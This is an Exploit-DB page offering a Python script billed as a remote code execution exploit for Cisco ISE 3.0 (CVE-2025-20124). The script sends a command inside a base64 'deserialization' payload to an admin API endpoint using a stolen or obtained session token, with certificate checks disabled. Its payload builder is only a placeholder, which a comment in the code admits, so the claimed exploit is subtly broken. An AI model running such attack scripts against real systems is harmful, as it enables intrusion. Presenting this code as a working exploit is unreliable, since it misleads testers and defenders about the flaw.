---
title: [remote] Cisco ISE 3.0 - Remote Code Execution (RCE)
url: https://www.exploit-db.com/exploits/52396
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:48:18.422653
---

# [remote] Cisco ISE 3.0 - Remote Code Execution (RCE)

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Cisco ISE 3.0 - Remote Code Execution (RCE)

#### EDB-ID:

###### 52396

#### CVE:

###### [2025-20124](https://nvd.nist.gov/vuln/detail/CVE-2025-20124)

---

**EDB Verified:**

#### Author:

###### [İbrahimsql](/?author=12279)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
# Exploit Title: Cisco ISE 3.0 - Remote Code Execution (RCE)
# Exploit Author: @ibrahimsql ibrahimsql.com
# Exploit Author's github: https://github.com/ibrahmsql
# Description: Cisco ISE API Java Deserialization RCE
# CVE: CVE-2025-20124
# Vendor Homepage: https://www.cisco.com/
# Requirements: requests>=2.25.0, urllib3>=1.26.0
# Usage: python3 CVE-2025-20124.py --url https://ise.target.com --session TOKEN --cmd "id"

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import sys
import argparse
import base64
import urllib3
urllib3.disable_warnings()

def banner():
    print(r"""
_________ .__
\_   ___ \|__| ______ ____  ____
/    \  \/|  |/  ___// ___\/  _ \
\     \___|  |\___ \\  \__(  <_> )
 \______  /__/____  >\___  >____/
        \/        \/     \/

Cisco ISE Java Deserialization RCE
CVE-2025-20124
Author: ibrahmsql | github.com/ibrahmsql
""")

def build_serialize_payload(cmd):
    """
    Java deserialization payload builder
    """
    java_cmd = cmd.replace('"', '\\"')
    # Placeholder serialization - gerçek exploit için gadget chain gerekli
    payload = f'\xac\xed\x00\x05sr\x00...ExecGadget...execute("{java_cmd}")'
    return base64.b64encode(payload.encode()).decode()

def exploit_deserialization(base_url, session_token, cmd):
    """
    CVE-2025-20124: Java Deserialization RCE
    """
    endpoint = f"{base_url}/api/v1/admin/deserializer"
    headers = {
        "Cookie": f"ISESSIONID={session_token}",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (compatible; ISE-Exploit)"
    }

    payload = build_serialize_payload(cmd)
    data = {"object": payload}

    print(f"[+] Target: {base_url}")
    print(f"[+] Endpoint: {endpoint}")
    print(f"[+] Command: {cmd}")
    print(f"[+] Sending deserialization payload...")

    try:
        r = requests.post(endpoint, json=data, headers=headers, verify=False, timeout=10)

        if r.status_code == 200:
            print("[+] Payload successfully sent!")
            print("[+] Command possibly executed!")
            if r.text:
                print(f"[+] Response: {r.text[:500]}")
        elif r.status_code == 401:
            print("[-] Authentication failed - invalid session token")
        elif r.status_code == 403:
            print("[-] Access denied - insufficient privileges")
        elif r.status_code == 404:
            print("[-] Endpoint not found - target may not be vulnerable")
        else:
            print(f"[-] Unexpected response: {r.status_code}")
            print(f"[-] Response: {r.text[:200]}")

    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-20124 - Cisco ISE Java Deserialization RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 CVE-2025-20124.py --url https://ise.company.com --session ABCD1234 --cmd "id"
  python3 CVE-2025-20124.py --url https://10.0.0.1:9060 --session TOKEN123 --cmd "whoami"
        """
    )

    parser.add_argument("--url", required=True, help="Base URL of Cisco ISE appliance")
    parser.add_argument("--session", required=True, help="Authenticated ISE session token")
    parser.add_argument("--cmd", required=True, help="Command to execute via deserialization")

    args = parser.parse_args()

    banner()

    # URL validation
    if not args.url.startswith(('http://', 'https://')):
        print("[-] URL must start with http:// or https://")
        sys.exit(1)

    exploit_deserialization(args.url, args.session, args.cmd)

if __name__ == "__main__":
    main()
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploi...